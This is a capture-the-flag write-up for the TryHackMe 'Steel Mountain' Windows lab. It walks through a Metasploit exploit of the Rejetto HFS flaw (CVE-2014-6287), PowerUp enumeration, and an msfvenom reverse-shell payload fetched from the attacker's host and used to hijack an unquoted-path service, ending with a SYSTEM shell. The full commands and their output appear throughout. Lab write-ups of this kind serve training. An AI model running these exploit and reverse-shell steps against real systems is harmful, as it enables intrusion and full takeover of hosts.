---
title: "TryHackMe - Steel Mountain"
categories:
  - Writeup
tags:
  - windows
  - powershell
  - exploit
  - writeup
  - tryhackme
  - hacking
  - nmap 
---
Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.

## Introduction
- Let's do Scanning first
    ```bash
    $ rustscan -a 10.10.197.255
    .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
    | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
    | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
    `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
    The Modern Day Port Scanner.
    ________________________________________
    : https://discord.gg/GFrQsGy           :
    : https://github.com/RustScan/RustScan :
    --------------------------------------
    Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

    [~] The config file is expected to be at "/home/kali/.rustscan.toml"
    [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
    [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
    Open 10.10.197.255:80
    Open 10.10.197.255:135
    Open 10.10.197.255:139
    Open 10.10.197.255:445
    Open 10.10.197.255:3389
    Open 10.10.197.255:5985
    Open 10.10.197.255:8080
    Open 10.10.197.255:47001
    Open 10.10.197.255:49152
    Open 10.10.197.255:49153
    Open 10.10.197.255:49154
    Open 10.10.197.255:49155
    Open 10.10.197.255:49156
    Open 10.10.197.255:49163
    Open 10.10.197.255:49164
    [~] Starting Script(s)
    [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

    [~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-11 04:21 EST
    Initiating Ping Scan at 04:21
    Scanning 10.10.197.255 [2 ports]
    Completed Ping Scan at 04:21, 0.20s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 04:21
    Completed Parallel DNS resolution of 1 host. at 04:21, 13.01s elapsed
    DNS resolution of 1 IPs took 13.01s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
    Initiating Connect Scan at 04:21
    Scanning 10.10.197.255 [15 ports]
    Discovered open port 445/tcp on 10.10.197.255
    Discovered open port 139/tcp on 10.10.197.255
    Discovered open port 3389/tcp on 10.10.197.255
    Discovered open port 80/tcp on 10.10.197.255
    Discovered open port 8080/tcp on 10.10.197.255
    Discovered open port 135/tcp on 10.10.197.255
    Discovered open port 49154/tcp on 10.10.197.255
    Discovered open port 49156/tcp on 10.10.197.255
    Discovered open port 47001/tcp on 10.10.197.255
    Discovered open port 49164/tcp on 10.10.197.255
    Discovered open port 49153/tcp on 10.10.197.255
    Discovered open port 49152/tcp on 10.10.197.255
    Discovered open port 49163/tcp on 10.10.197.255
    Discovered open port 49155/tcp on 10.10.197.255
    Discovered open port 5985/tcp on 10.10.197.255
    Completed Connect Scan at 04:21, 0.40s elapsed (15 total ports)
    Nmap scan report for 10.10.197.255
    Host is up, received syn-ack (0.20s latency).
    Scanned at 2021-01-11 04:21:39 EST for 13s

    PORT      STATE SERVICE       REASON
    80/tcp    open  http          syn-ack
    135/tcp   open  msrpc         syn-ack
    139/tcp   open  netbios-ssn   syn-ack
    445/tcp   open  microsoft-ds  syn-ack
    3389/tcp  open  ms-wbt-server syn-ack
    5985/tcp  open  wsman         syn-ack
    8080/tcp  open  http-proxy    syn-ack
    47001/tcp open  winrm         syn-ack
    49152/tcp open  unknown       syn-ack
    49153/tcp open  unknown       syn-ack
    49154/tcp open  unknown       syn-ack
    49155/tcp open  unknown       syn-ack
    49156/tcp open  unknown       syn-ack
    49163/tcp open  unknown       syn-ack
    49164/tcp open  unknown       syn-ack
    ```
    Port 80 open, let's investigate.

- Here is the front-end of the website at port 80.
    <a href="/assets/images/tryhackme/steel-mountain/1.png"><img src="/assets/images/tryhackme/steel-mountain/1.png"></a>
- Right click the image and click "View Image" and we got the employye of the month's name.
    <a href="/assets/images/tryhackme/steel-mountain/2.png"><img src="/assets/images/tryhackme/steel-mountain/2.png"></a>

## Initial Access
- Scan the machine with nmap. What is the other port running a web server on?
> We already did a rustscan (similar to Nmap) and there is a web server at port 8080.

- Take a look at the other web server. What file server is running?
    <a href="/assets/images/tryhackme/steel-mountain/3.png"><img src="/assets/images/tryhackme/steel-mountain/3.png"></a>
    
    It's **rejetto http file server**.

- What is the CVE number to exploit this file server?
> It's CVE-2014-6287.<br><br>From [here](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=rejetto+http+file+server).

- Use Metasploit to get an initial shell. What is the user flag?
    - Open metasploit
        ```bash
        $ msfconsole
        ```
    - Search the CVE
        ```bash
        msf6 > search 2014-6287

        Matching Modules
        ================

        #  Name                                   Disclosure Date  Rank       Check  Description
        -  ----                                   ---------------  ----       -----  -----------
        0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
        ```
    - Use it and gain access!
        ```bash
        msf6 > use 0
        msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
        RPORT => 8080
        msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.197.255
        RHOSTS => 10.10.197.255
        msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.11.25.205
        LHOST => 10.11.25.205
        msf6 exploit(windows/http/rejetto_hfs_exec) > exploit 

        [*] Started reverse TCP handler on 10.11.25.205:4444 
        [*] Using URL: http://0.0.0.0:8080/HweAtVt2hlPv
        [*] Local IP: http://192.168.40.129:8080/HweAtVt2hlPv
        [*] Server started.
        [*] Sending a malicious request to /
        /usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
        /usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
        [*] Payload request received: /HweAtVt2hlPv
        [*] Sending stage (175174 bytes) to 10.10.197.255
        [*] Meterpreter session 1 opened (10.11.25.205:4444 -> 10.10.197.255:49251) at 2021-01-11 04:47:19 -0500
        [*] Server stopped.
        [!] This exploit may require manual cleanup of '%TEMP%\NAKkKmMQjUaysU.vbs' on the target

        meterpreter >
        ```
    - Get the user flag.
        ```bash
        meterpreter > ls Desktop
        Listing: Desktop
        ================

        Mode              Size  Type  Last modified              Name
        ----              ----  ----  -------------              ----
        100666/rw-rw-rw-  282   fil   2019-09-27 07:07:07 -0400  desktop.ini
        100666/rw-rw-rw-  70    fil   2019-09-27 08:42:38 -0400  user.txt

        meterpreter > cat Desktop/user.txt
        ��REDACTED
        ```

## Privilege Escalation
- Upload the [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) shell to enumerate.
    ```bash
    meterpreter > upload ~/PowerUp.ps1
    [*] uploading  : /home/kali/PowerUp.ps1 -> PowerUp.ps1
    [*] Uploaded 1.87 MiB of 1.87 MiB (100.0%): /home/kali/PowerUp.ps1 -> PowerUp.ps1
    [*] uploaded   : /home/kali/PowerUp.ps1 -> PowerUp.ps1
    ```
- Execute the script
    ```bash
    meterpreter > load powershell
    meterpreter > powershell_shell 
    PS > . .\PowerUp.ps1
    PS > Invoke-AllChecks
    ...
    ```
    - Output:
         ```
        ServiceName    : AdvancedSystemCareService9
        Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
        ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
        StartName      : LocalSystem
        AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
        CanRestart     : True
        Name           : AdvancedSystemCareService9
        Check          : Unquoted Service Paths

        ServiceName    : AdvancedSystemCareService9
        Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
        ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
        StartName      : LocalSystem
        AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
        CanRestart     : True
        Name           : AdvancedSystemCareService9
        Check          : Unquoted Service Paths

        ServiceName    : AdvancedSystemCareService9
        Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
        ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                        Permissions=System.Object[]}
        StartName      : LocalSystem
        AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
        CanRestart     : True
        Name           : AdvancedSystemCareService9
        Check          : Unquoted Service Paths

        ServiceName    : AdvancedSystemCareService9
        Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
        ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                        IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
        StartName      : LocalSystem
        AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
        CanRestart     : True
        Name           : AdvancedSystemCareService9
        Check          : Unquoted Service Paths
        ...
        ```


- Take close attention to the CanRestart option that is set to true. What is the name of the name of the service which shows up as an unquoted service path vulnerability?
> It's AdvancedSystemCareService9.

- What is the root flag?
    - Generate our msfvenom reverse shell payload
        ```bash
        $ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.25.205 LPORT=4449 -e x86/shikata_ga_nai -f exe -o ASCService.exe
        [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
        [-] No arch selected, selecting arch: x86 from the payload
        Found 1 compatible encoders
        Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
        x86/shikata_ga_nai succeeded with size 351 (iteration=0)
        x86/shikata_ga_nai chosen with final size 351
        Payload size: 351 bytes
        Saved as: ASCService.exe
        ```
    - Upload our binary
        ```bash
        PS > Invoke-WebRequest "http://10.11.25.205:8080/ASCService.exe" -OutFile "C:\users\bill\desktop\ASCService.exe"
        PS > dir
            Directory: C:\Users\bill\Desktop

        Mode                LastWriteTime     Length Name
        ----                -------------     ------ ----
        -a---         1/11/2021   2:31 AM        351 ASCService.exe
        -a---         1/11/2021   2:14 AM     600580 PowerUp.ps1
        -a---         9/27/2019   5:42 AM         70 user.txt
        ```
    - Stop the service process
        ```bash
        C:\Users\bill\Desktop>sc stop AdvancedSystemCareService9
        sc stop AdvancedSystemCareService9

        SERVICE_NAME: AdvancedSystemCareService9 
                TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
                STATE              : 4  RUNNING 
                                        (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
                WIN32_EXIT_CODE    : 0  (0x0)
                SERVICE_EXIT_CODE  : 0  (0x0)
                CHECKPOINT         : 0x0
                WAIT_HINT          : 0x0
        ```

    - Copy the file to the right path
        ```bash
        C:\Users\bill\Desktop>copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
        copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
        Overwrite \Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe? (Yes/No/All): Yes
        Yes
                1 file(s) copied.
        ```
    - Start our listener
        ```bash
        $ nc -lnvp 4449
        listening on [any] 4449 ...
        ```
    - Start the service
        ```bash
        C:\Users\bill\Desktop>sc start AdvancedSystemCareService9
        ```
    - Get shell
        ```bash
        $ nc -lnvp 4449
        listening on [any] 4449 ...
        connect to [10.11.25.205] from (UNKNOWN) [10.10.209.88] 49234
        Microsoft Windows [Version 6.3.9600]
        (c) 2013 Microsoft Corporation. All rights reserved.

        C:\Windows\system32>whoami
        whoami
        nt authority\system
        ```
    - Root.txt
        ```bash
        C:> cd C:\Users\Administrator\Desktop
        C:\Users\Administrator\Desktop>dir
        dir
        Volume in drive C has no label.
        Volume Serial Number is 2E4A-906A

        Directory of C:\Users\Administrator\Desktop

        10/12/2020  11:05 AM    <DIR>          .
        10/12/2020  11:05 AM    <DIR>          ..
        10/12/2020  11:05 AM             1,528 activation.ps1
        09/27/2019  04:41 AM                32 root.txt
                    2 File(s)          1,560 bytes
                    2 Dir(s)  44,155,412,480 bytes free

        C:\Users\Administrator\Desktop>type root.txt
        type root.txt
        REDACTED
        ```